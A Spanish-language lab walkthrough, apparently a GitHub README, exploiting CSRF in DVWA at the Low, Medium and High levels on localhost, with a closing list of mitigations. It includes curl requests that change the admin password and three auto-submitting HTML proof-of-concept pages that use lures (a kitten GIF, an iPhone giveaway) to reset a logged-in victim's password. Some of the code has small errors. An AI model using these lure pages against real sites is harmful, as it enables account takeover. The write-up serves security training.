# Cross-Site Request Forgery (CSRF) en DVWA LOW

## 🧩 1 ¿Qué es CSRF?

- **CSRF:** Es un ataque que fuerza al navegador de una víctima autenticada a ejecutar una acción en un sitio donde está logueada (cambiar contraseña, email...) sin la intención de dicha víctima.
- No necesita leer la respuesta; solo que el navegador envíe la petición con las ***cookies de sesión*** de la víctima.

## Conceptos clave 

- **Estado (state-changing):** Acción que modifica algo en el servidor (ej: cambiar contraseña).
- **Anti-CSRF token:** Valor secreto, impredecible, por solicitud, que el servidor incluye en el formulario y valida al recibirlo.
- **SameSite cookie:** Atributo de cookie (SameSite-Lax/Strict/None) que controla si la cookie se envía en peticiones cross-site (mitiga muchos CSRF).
- **Referer / Origin:** Cabeceras que indican de dónde viene la petición; algunos sitios las validan para mitigar CSRF (defensa débil si se usa sola).
- **Double-submit cookie:** Patrón defensivo que envía el token tanto en cookie como en cuerpo/cabecera y el servidor compara ambos.

## 2 Objetivo en DVWA

DVWA tiene un módulo CSRF que permite cambiar la contraseña del usuario actual. Vamos a:

1. Confirmar el cambio de contraseña con curl (Low).
2. Construir un **PoC HTML** que, al visitarlo la víctima logueada, cambia su contraseña.
3. Explorar Medium/High y evidenciar qué controles aparecen.
4. Documentar mitigaciones.

## 3 Recolección inicial

### 3.1 Obtenemos cookie de sesión manualmente:

- Iniciamos sesión en DVWA desde el navegador.
- Abrimos las herramientas de desarrollador (F12 → pestaña "Aplicación" o "Storage").
- Copiamos el valor de PHPSESSID.

### 3.2 Obtenemos cookie de sesión por la terminal:

- Abrimos nuestra terminal y ejecutamos el siguiente comando en Bash, el cual nos ofrecerá toda la información, incluida la cookie:

```bash
# Ver cookies y sus atributos (SameSite, HttpOnly, Secure)
curl -I http://127.0.0.1:8080 | grep -i set-cookie
```

<img width="640" height="145" alt="imagen" src="https://github.com/user-attachments/assets/84e4ccd4-d3a3-4ace-ae6f-28fe16264cec" />


Abre DVWA → CSRF y mira el formulario de "Change Password". En Low, suele aceptar GET sin token.

<img width="678" height="361" alt="imagen" src="https://github.com/user-attachments/assets/b55c6395-bd50-48be-8c95-f158953dd072" />

## 4 Explotación -- Nivel LOW

### 🔐 4.1. Cambiar contraseña con curl (GET).

#### 📌 Objetivo

Enviar una petición GET a DVWA para cambiar la contraseña del usuario actual a pepito, sin usar el formulario web, sino desde la terminal.

#### 🛠️ Paso a paso

1. Ejecutamos en la terminal el siguiente comando en consola:

```bash
curl -i "http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=pepito&password_conf=pepito&Change=Change" \
  --cookie "PHPSESSID=e4461uipj20cvits72f6mmeh36; security=low"
```

##### 🔍 Explicación del comando:

- curl-l: muestra encabezados HTTP + contenido.
- URL: contiene los parámetros GET para cambiar la contraseña.
- --cokie: simula que estás logueado, enviando tu sesión activa.

Verificamos la respuesta:

- Debemos ver HTTP/1.1 200 OK
- En el cuerpo, buscamos: Password Changed.


<img width="922" height="215" alt="imagen" src="https://github.com/user-attachments/assets/834830d6-98f2-4d16-82fb-5d0929f177e8" />

<img width="755" height="306" alt="imagen" src="https://github.com/user-attachments/assets/e5ad0e7b-a9a9-458f-a759-85fff06128e7" />


Confirmamos el cambio:

- Vamos al login de DVWA para volver a iniciar sesión.
- Usamos el usuario original con el que la víctima estaba autenticada (en este caso admin) y probamos la nueva contraseña: pepito.
- Confirmamos que podemos entrar con las nuevas credenciales.


### 🧨 4.2 PoC HTML (auto-CSRF)

#### 📌 Objetivo

Crear una página maliciosa que, al ser visitada por un usuario logueado en DVWA, le ***cambie la contraseña automáticamente*** sin que se dé cuenta.

#### 🛠️ Paso a paso

1. Usamos un editor de texto como **nano** y creamos el archivo:

```bash
nano ~/Pentesting/DVWA/exploits/dvwa_csrf_low_poc.html
```

Si la carpeta Pentesting/DVWA/exploits no existe, la creamos antes con:

```
mkdir -p ~/Pentesting/DVWA/exploits
```

2. Una vez dentro del editor de texto nano, creamos la página HTML:

```html
<!doctype html>
<html>
  <body onload="document.images[0].src='http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change'">
    <img style="display:none" alt="">
    <h1>😺 Mira este GIF de gatitos</h1>
  </body>
</html>
```

Guardamos el archivo con Ctrl + O, pulsamos Enter y salimos con Ctrl + X.

🧾 Explicación del HTML 

```html
<!doctype html>
<html>
```

- <!doctype html>: Indica que el documento usa HTML5.
- <html>: Comienza el contenido HTML de la página.

```html
<body onload="document.images[0].src='http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change'">
```

- <body>: Contiene el contenido visible (y funcional) de la página.
- onload="...": Ejecuta el código JavaScript cuando la página termina de cargar.
- document.images[0].src = ...:
  - Accede a la primera imagen (<img>) del documento.
  - Le asigna una URL como fuente (src), lo que provoca que el navegador haga una petición      GET a esa URL.
  - La URL apunta a DVWA y contiene parámetros para cambiar la contraseña:
    - password_new=hacked: nueva contraseña.
    - password_conf=hacked: confirmación de la nueva contraseña.
    - Change=Change: valor del botón de envío.

⚠️ Aunque parece que se está cargando una imagen, en realidad se está disfrazando una petición maliciosa como si fuera una imagen. Esto es una técnica clásica en ataques CSRF.

```html
<img style="display:none" alt="">
```

- Crea una imagen invisible:
  - style="display:none": oculta la imagen para que el usuario no la vea.
  - alt="": texto alternativo vacío.
- Esta imagen es la que se usa para lanzar la petición GET al servidor vulnerable.

```html
<h1>😺 Mira este GIF de gatitos</h1>
```

- Texto visible en la página.
- Sirve como distracción o anzuelo para que el usuario cargue la página sin sospechar.

```html
</body>
</html>
```

- Cierre de las etiquetas body y html.

🧠 ¿Qué hace este HTML en conjunto?

- Simula una página inocente.
- Al abrirla, el navegador del usuario (si está logueado en DVWA) envía automáticamente una petición GET que cambia su contraseña.
- El usuario no ve nada sospechoso, solo un mensaje simpático.
- El atacante logra ejecutar una acción sin interacción directa del usuario.
- Como estamos en el nivel bajo de seguridad, DVWA no exige token CSRF, así que la petición debería funcionar si el usuario está logueado.

3. Levantamos un servidor web local simple y sin cifrado con python:

```bash
cd ~/Pentesting/DVWA/exploits
python3 -m http.server 9000
```

Esto crea un servidor web en http://127.0.0.1:9000.

<img width="487" height="95" alt="imagen" src="https://github.com/user-attachments/assets/e1c085ad-8e7b-4be8-bc86-738edb08d889" />

⚠️ Advertencia:

- Estos servidores no soportan https, ya que el navegador intenta negociar una conexión segura (SSL/TLS), pero el servidor no sabe como responder.

#### 📌 Explicación:

- Cuando se carga la página, el navegador hace una petición GET a DVWA.
- Como el usuario está logueado, se envía la cookie automáticamente.
- DVWA procesa el cambio de contraseña sin pedir confirmación.


3. Visitamos la página como víctima para probar el ataque:

- Asegurarnos de que estamos logueados en DVWA.
- Abrimos: http://127.0.0.1:9000/dvwa_csrf_low_poc.html

Como podemos observar en la siguiente imagen, vemos que nuestro archivo HTML creado está cargado en el navegador, lo que significa que el servidor local está funcionando correctamente.

<img width="914" height="442" alt="imagen" src="https://github.com/user-attachments/assets/881aace5-1e7d-4af9-9909-a629ab09a699" />

4. Verificamos el cambio:

- Tras ejecutar la víctima nuestra URL del HTML que creamos, el siguiente paso sería cerrar la cuenta que tenemos abierta (en este caso admin) y volver a loguearnos con la nueva contraseña hacked.

Al salir, hemos entrado con user:admin y password:hacked

<img width="961" height="855" alt="imagen" src="https://github.com/user-attachments/assets/eb19ff40-1ea6-4da4-a4ba-e7d898d7c96e" />

Por tanto, se ha hecho efectivo este PoC para robar contraseñas al usuario autenticado.

Nota: Usamos <img> porque en Low el cambio acepta GET. También valdría un <form> auto-submit si fuese POST.

### 🧠 ¿Por qué funciona esto?

En nivel low, DVWA no verifica:

- Si la petición viene del formulario legítimo.
- Si hay token CSRF.
- Si el método es seguro (acepta GET).

Por eso, cualquier petición GET con los parámetros correctos y una cookie válida puede cambiar la contraseña.

# Cross-Site Request Forgery (CSRF) en DVWA MEDIUM

En nivel Low, DVWA aceptaba ***cualquier petición GET*** con los parámetros correctos y una cookie válida.

1) Probamos con dos peticiones en esa ocasión: GET y POST

```bash
curl -i \
  "http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=test123&password_conf=test123&Change=Change" \
  --cookie "PHPSESSID=d78uv7uh9qku7l5nbk7ht9ve20; security=medium"
```

```bash
curl -i -X POST "http://127.0.0.1:8080/vulnerabilities/csrf/" \
  --data "password_new=test123&password_conf=test123&Change=Change" \
  --cookie "PHPSESSID=d78uv7uh9qku7l5nbk7ht9ve20; security=medium"
```

Y, aunque, aparentemente nos muestra al principio de la consola la siguiente información:

HTTP/1.1 200 OK
Date: Mon, 18 Aug 2025 15:33:18 GMT
Server: Apache/2.4.25 (Debian)
Expires: Tue, 23 Jun 2009 12:00:00 GMT
Cache-Control: no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 4322
Content-Type: text/html;charset=utf-8

Lo realmente interesante, está casi al final de la información ofrecida donde nos encontramos con:

```html
<pre>That request didn't look correct.</pre>
```

Esto significa que DVWA ***rechazó la petición porque no incluía el token*** CSRF necesario y ninguno de los dos métodos GET y POST nos permite realizar el ataque.

## 🔐 ¿Qué es un token CSRF?

Es un valor único que se genera por el servidor y se incluye en el formulario HTML. Sirve para verificar que la petición viene de una fuente legítima (el navegador del usuario). Sin ese token, DVWA no acepta el cambio de contraseña.

## 🧪 ¿Cómo obtener el token CSRF?

Necesitamos hacer una petición previa para ***extraer el token del formulario***. El token suele verse así en el HTML:

```html
<input type="hidden" name="user_token" value="abc123xyz">
```

## 🛠️ Paso a paso para hacer el ataque en Medium

### 1. Hacemos petición GET para obtener el token

```bash
curl -s \
  "http://127.0.0.1:8080/vulnerabilities/csrf/" \
  --cookie "PHPSESSID=TU_SESION; security=medium"
```

O, para evitar que curl -s nos oculte errores probamos con:

```bash
curl -i "http://127.0.0.1:8080/vulnerabilities/csrf/" \
  --cookie "PHPSESSID=...; security=medium"
```

Y revisamos si el HTML completo incluye el campo user_token.

Buscamos en la respueta HTML algo como:

```html
<input type="hidden" name="user_token" value="abc123xyz">
```

Aunque la petición nos devuelve el HTML no encontramos el TOKEN dentro del mismo, es decir, el token probablemente se ***genera dinámicamente con JavaScript*** y por esa misma razón no aparece en la respueta de curl, ya que curl no lo vería porque no ejecuta scripts. Para comprobarlo, abrimos la página en el navegador y resivamos el código fuente (Ctrl + U) e inspeccionamos el formulario con las herramientas del desarrollador.

Como observamos en la página web, **el token user_token no aparece en el HTML estático**

En el formulario, vemos:

```html
<form action="#" method="GET">
  New password:<br />
  <input type="password" AUTOCOMPLETE="off" name="password_new"><br />
  Confirm new password:<br />
  <input type="password" AUTOCOMPLETE="off" name="password_conf"><br />
  <br />
  <input type="submit" value="Change" name="Change">
</form>
```

Y, como observamos, no hay ningún campo user_token, lo que confirma que el ***token CSRF no se inserta en el HTML directamente***. Esto es algo típico del nivel Medium en DVWA, donde el token se inyecta dinámicamente con JavaScript.

Entonces, ¿dónde lo buscamos? 🕵️‍♂️

El siguiente paso lógico sería inspeccionar el DOM en tiempo real usando las herramientas del desarrollador:

1. Abrir DVWA en el navegador e ir a la sección CSRF.
2. Pulsamos F12 o clic derecho → “Inspeccionar”.
3. Ir pestaña "Elements" o "Inspector".
4. Buscamos el formulario y revisamos si aparece un campo como:

```html
<input type="hidden" name="user_token" value="abc123xyz">
```

Confirmamos que en nivel Medium no existe el token tampoco, ya que no encontramos en HTML la línea de código y, si utilizamos en F12 -> Console el siguiente comando:

```Javascript
document.querySelector('input[name="user_token"]').value
```

Nos lanza este mensaje de error:

Uncaught TypeError: document.querySelector(...) is null
    <anonymous> debugger eval code:1


### 2. Usamos ese token en el ataque, que no pudo ser debido a que el paso anterior nos dejó claro que en Medium aún no tienen la opción del Token CSRF pero lo dejamos aquí para más información y conocimiento

Ahora que tenemos el token, hacemos una petición GET incluyendo user_token=abc123xyz:

```bash
curl -i \
  "http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=test123&password_conf=test123&Change=Change&user_token=abc123xyz" \
  --cookie "PHPSESSID=TU_SESION; security=medium"
```

Sustituye abc123xyz por el token real que obtuviste.

## 🧾 ¿Por qué esto es importante?

Este mecanismo impide que un atacante externo pueda hacer una petición sin conocer el token. Pero si el atacante puede leer el HTML (por ejemplo, mediante XSS), puede extraer el token y lanzar el ataque.

## 🧠 ¿Y el PoC HTML?

1. Abrimos la terminal y creamos el archivo:

```bash
nano dvwa_csrf_medium_poc.html
```

2. Cuando se abra el editor de texto nano, creamos el HTML:

```html
<!DOCTYPE html>
<html>
  <body>
    <form action="http://127.0.0.1:8080/vulnerabilities/csrf/" method="GET">
      <input type="hidden" name="password_new" value="hacked2">
      <input type="hidden" name="password_conf" value="hacked2">
      <input type="hidden" name="Change" value="Change">
    </form>
    <script>
      document.forms[0].submit();
    </script>
    <h1>😼 ¡Tu contraseña ha sido cambiada sin que lo sepas!</h1>
  </body>
</html>
```

Puedes abrir este archivo en el navegador mientras estás autenticado en DVWA como admin, y si todo va bien, la contraseña se cambiará automáticamente.

3. Ejecutamos el PoC en el navegador sirviendolo desde un servidor local:

Esto es útil cuando queremos simular que el ataque viene desde otro sitio web.

3.1 Vamos al directorio donde guardamos el archivo.

```bash
cd /home/javier
```

3.2 Lanzamos el servidor web con Python:

```bash
python3 -m http.server 8000
```

3.3 Abrimos el navegador y visitamos:

```codigo
http://127.0.0.1:8000/dvwa_csrf_medium_poc.html
```

Como observamos en la siguiente imagen, al visitar la víctima la URL que hemos creado cambia la contraseña:

<img width="663" height="283" alt="imagen" src="https://github.com/user-attachments/assets/2d8d3c73-ecc5-42e9-8bec-ee898c7d4a44" />

✅ ¿Qué significa esto?

- El navegador, al visitar tu PoC, envió una petición GET con los parámetros necesarios.
- DVWA no tenía protección CSRF activa en este nivel.
- La contraseña del usuario admin fue cambiada sin interacción directa.

# 🔐 Cross-Site Request Forgery (CSRF) en DVWA HIGH

En nivel High, DVWA ***introduce una protección básica contra CSRF: ahora requiere que la petición incluya un token CSRF*** válido. Este token se genera dinámicamente y se espera que venga en la petición. Sin leer el token desde la página de la víctima, la CSRF debería fallar.

## 🧠 ¿Cómo lo atacamos?

Necesitamos:

- Obtener el token CSRF desde el formulario.

- Usar el token CSRF dinámico en una petición POST para cambiar la contraseña.

- Requiere que el atacante lo obtenga y lo incluya en el ataque.

## 🛠️ Observamos el token en el formulario

```bash
curl -s "http://127.0.0.1:8080/vulnerabilities/csrf/" \
  --cookie "PHPSESSID=TU_SESION; security=high" | \
  grep -Eo 'name="user_token" value="[^"]+"'
```

O, de manera manual, en el navegador pulsamos Ctrl + U y se abrirá el código fuente de la página y buscamos:

```html
<input type="hidden" name="user_token" value="abc123xyz">
```

<img width="647" height="143" alt="imagen" src="https://github.com/user-attachments/assets/14584a99-9919-4ab4-a3ec-b56abe81ce53" />

Copiamos el valor del token para posteriormente utilizarlo.

## 🧨 Creamos el PoC HTML

Guardamos el archivo como dvwa_csrf_high_poc.html:

```html
  GNU nano 8.4                                  dvwa_csrf_high_poc.html                                            
<!DOCTYPE html>
<!DOCTYPE html>
<html>
  <head>
    <title>¡Gana un iPhone 15!</title>
    <style>
      body { font-family: sans-serif; text-align: center; margin-top: 50px; }
      .card { border: 1px solid #ccc; padding: 20px; width: 300px; margin: auto; box-shadow: 2px 2px 10px #aaa; }
      .card img { width: 100%; }
    </style>
  </head>
  <body>
    <div class="card">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/IPhone_15_Pro_vector.svg/800px-IPhone_15>
      <h2>¡Participa en el sorteo!</h2>
      <p>Solo por visitar esta página, entras en el sorteo de un iPhone 15.</p>
    </div>

    <form action="http://127.0.0.1:8080/vulnerabilities/csrf/" method="GET">
  <input type="hidden" name="password_new" value="hacked3">
  <input type="hidden" name="password_conf" value="hacked3">
  <input type="hidden" name="Change" value="Change">
  <input type="hidden" name="user_token" value="4c55822e3cfdc291b693dcd8a2519a2b">
  <input type="submit" value="¡Gana un iPhone!">
    </form>


    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Recuerda usar el valor del token real de tu web y ponerlo en la línea de:  <input type="hidden" name="user_token" value="d68c51a2a2eb44b3ec64c3082a8ac230">

## 🌐 Servimos la página

```bash
cd ~/Pentesting/DVWA/exploits
python3 -m http.server 9000
```

<img width="485" height="62" alt="imagen" src="https://github.com/user-attachments/assets/d951eaa5-1733-4784-96a3-e3f5feab4be2" />


Y visitamos en el navegador:

```codigo
http://127.0.0.1:8080/dvwa_csrf_high_poc.html
```

<img width="631" height="263" alt="imagen" src="https://github.com/user-attachments/assets/067d7612-321a-41f8-a56f-78f1e0c40534" />

Como observamos, la contraseña ha sido también modificada en High.


## ✅ Mitigaciones

- Tokens anti-CSRF impredecibles, por solicitud/sesión; invalidar al usarlos.
- SmaeSite cookies (Lax o Strict) + Secure y HttpOnly donde aplique.
- Acciones de estado solo por POST/PUT, nunca por GET.
- Validación de Origin/Referer como capa adicional (no única).
- Re-autenticación/MFA para acciones sensibles.
- CSP y reducción de superficies de ataque (no evita CSRF, pero ayuda contra XSS que podría robar tokens).
- Rotar tokens y invalidar el logout.



